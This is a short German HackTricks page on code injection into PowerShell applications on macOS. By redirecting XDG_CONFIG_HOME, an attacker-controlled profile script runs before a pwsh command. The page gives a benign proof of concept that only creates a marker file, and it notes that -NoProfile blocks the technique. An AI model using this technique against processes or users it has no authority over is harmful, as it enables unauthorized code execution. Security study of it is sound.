# Injection von PowerShell-Anwendungen unter macOS

{{#include ../../../banners/hacktricks-training.md}}

## `XDG_CONFIG_HOME` und PowerShell-Profile

Unter macOS und Linux verwendet PowerShell XDG-Konfigurationspfade und führt beim Start von `pwsh` Benutzerprofilskripte aus. Durch die Umleitung von `XDG_CONFIG_HOME` wird das Verzeichnis geändert, das `powershell/profile.ps1` und das konsolenhostspezifische `powershell/Microsoft.PowerShell_profile.ps1` enthält; eine kontrollierte Datei an dieser Stelle kann daher vor einer `-Command`-Payload ausgeführt werden.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/ps-config/powershell
cat >/tmp/ps-config/powershell/Microsoft.PowerShell_profile.ps1 <<'PS1'
New-Item -ItemType File -Path /tmp/powershell-profile-executed -Force | Out-Null
PS1

XDG_CONFIG_HOME=/tmp/ps-config pwsh -Command '$true'
```
Dies gilt für PowerShell 6+ (`pwsh`) auf Nicht-Windows-Plattformen; Windows PowerShell verwendet andere Profile-Speicherorte. `pwsh -NoProfile` unterdrückt das Laden von Profilen. Überprüfe außerdem `HOME` und hostspezifische Profilnamen, da andere PowerShell-Hosts unterschiedliche Skripte auswählen können.

## References

- [1] [PowerShell-Umgebungsvariablen und XDG-Pfade](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables)
- [2] [PowerShell-Profile](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles)
{{#include ../../../banners/hacktricks-training.md}}
